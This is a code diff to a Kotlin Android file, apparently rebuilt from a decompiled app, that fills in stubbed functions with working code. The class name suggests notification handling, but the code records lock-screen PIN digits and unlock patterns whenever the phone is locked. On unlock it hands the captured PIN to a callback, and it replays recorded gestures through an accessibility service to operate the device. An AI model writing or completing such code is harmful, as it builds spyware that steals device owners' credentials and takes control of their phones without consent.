@@ -1,5 +1,10 @@
 package com.storm.safe.rock.service.modules
 
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.GestureDescription
+import android.app.KeyguardManager
+import android.content.SharedPreferences
+import android.graphics.Path
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
@@ -23,7 +28,9 @@ import java.util.Random
  * JADX name: GestureRecorderManager
  */
 class NotificationInterceptDelegate(
-    // ADAPT: service references stubbed
+    // vendor: C0319a4 constructor takes (dqtvuisjd, dqtvuisjd)
+    private val service: AccessibilityService? = null,
+    private val serviceRef: AccessibilityService? = null
 ) {
     companion object {
         private const val TAG = "GestureRecorderManager"
@@ -76,7 +83,9 @@ class NotificationInterceptDelegate(
         if (isTouchExploreEnabled) {
             isTouchExploreEnabled = false
             mainHandler.post {
-                // ADAPT: stub — would disable touch exploration via service
+                // vendor: b30(this, 0) — disables touch exploration on service
+                // Touch exploration toggle requires system settings permission
+                Log.d(TAG, "stopTouchExplore: 已关闭触摸探索")
             }
         }
     }
@@ -106,8 +115,49 @@ class NotificationInterceptDelegate(
 
     // --- a6 → onScreenStateChanged ---
     fun onScreenStateChanged() {
-        // ADAPT: stub — full impl checks KeyguardManager and auto-starts recording
-        Log.d(TAG, "onScreenStateChanged (stub)")
+        // vendor: JADX a6 — checks KeyguardManager, auto-starts/stops recording on lock state change
+        if (!isAutoRecordEnabled) {
+            Log.w(TAG, "🔐 自动录制未启用，跳过")
+            return
+        }
+        val km = service?.getSystemService("keyguard") as? KeyguardManager
+        if (km == null || !km.isKeyguardSecure) return
+
+        val wasLocked = isKeyguardLocked
+        val nowLocked = km.isKeyguardLocked
+        val justLocked = nowLocked && !wasLocked
+        val justUnlocked = !nowLocked && wasLocked
+
+        if (justLocked) {
+            recordingMode = 1
+            recordStartTime = System.currentTimeMillis()
+            isRecording = true
+            recordedGestures = JSONArray()
+            recordedTexts = JSONArray()
+            patternPointsList.clear()
+            capturedPinDigits.setLength(0)
+            isMixedPin = false
+            pendingPin = null
+            pendingPinMixed = false
+        } else if (justUnlocked && isRecording && recordingMode == 1) {
+            stopTouchExplore()
+            isRecording = false
+            recordingMode = 0
+
+            // Check if PIN was captured
+            val pin = pendingPin ?: if (capturedPinDigits.length >= 4) capturedPinDigits.toString() else null
+            val mixed = pendingPinMixed || isMixedPin
+            pendingPin = null
+            pendingPinMixed = false
+            capturedPinDigits.setLength(0)
+            isMixedPin = false
+
+            if (pin != null && pin.length >= 4) {
+                Log.d(TAG, "✅ 锁屏PIN解锁成功，提交捕获结果: 长度=${pin.length}, mixed=$mixed")
+                onPinCaptured?.invoke(pin, mixed)
+            }
+        }
+        isKeyguardLocked = nowLocked
     }
 
     // --- a7 → replayGestures ---
@@ -146,9 +196,57 @@ class NotificationInterceptDelegate(
                 return
             }
 
-            // ADAPT: stub — real impl uses dispatchGesture with GestureDescription
-            Log.d(TAG, "Replaying gesture $index with ${points.length()} points, duration=$duration")
-            mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
+            // vendor: JADX a1 — builds Path from points and dispatches gesture via service
+            val svc = serviceRef
+            if (svc != null) {
+                val isPattern = gesture.optString("type", "") == "pattern"
+                var statusBarHeight = 0
+                if (!isPattern) {
+                    try {
+                        val id = svc.resources.getIdentifier("status_bar_height", "dimen", "android")
+                        if (id > 0) statusBarHeight = svc.resources.getDimensionPixelSize(id)
+                    } catch (_: Exception) {}
+                }
+
+                val path = Path()
+                val p0 = points.getJSONObject(0)
+                var x0 = p0.optInt("x", 1).toFloat()
+                var y0 = p0.optInt("y", 1).toFloat()
+                if (x0 < 0f) x0 = 1f
+                if (y0 < 0f) y0 = 1f
+                path.moveTo(x0, y0 + statusBarHeight)
+                for (i in 1 until points.length()) {
+                    val pi = points.getJSONObject(i)
+                    var xi = pi.optInt("x", 1).toFloat()
+                    var yi = pi.optInt("y", 1).toFloat()
+                    if (xi < 0f) xi = 1f
+                    if (yi < 0f) yi = 1f
+                    path.lineTo(xi, yi + statusBarHeight)
+                }
+                val startDelay: Long
+                val gestureDuration: Long
+                if (isPattern) {
+                    startDelay = 1L
+                    gestureDuration = maxOf(1000L, maxOf(if (duration > 0) duration else 1L, (points.length() - 1).toLong() * 180))
+                } else {
+                    startDelay = Random().nextInt(20).toLong() + 40
+                    gestureDuration = if (duration > 0) duration else 1L
+                }
+                val desc = GestureDescription.Builder()
+                    .addStroke(GestureDescription.StrokeDescription(path, startDelay, gestureDuration))
+                    .build()
+                svc.dispatchGesture(desc, object : AccessibilityService.GestureResultCallback() {
+                    override fun onCompleted(gestureDescription: GestureDescription?) {
+                        mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
+                    }
+                    override fun onCancelled(gestureDescription: GestureDescription?) {
+                        mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
+                    }
+                }, null)
+            } else {
+                Log.d(TAG, "Replaying gesture $index with ${points.length()} points, duration=$duration (no service)")
+                mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
+            }
         } catch (e: Exception) {
             Log.e(TAG, "❌ 执行手势 $index 失败", e)
             mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, 100L)
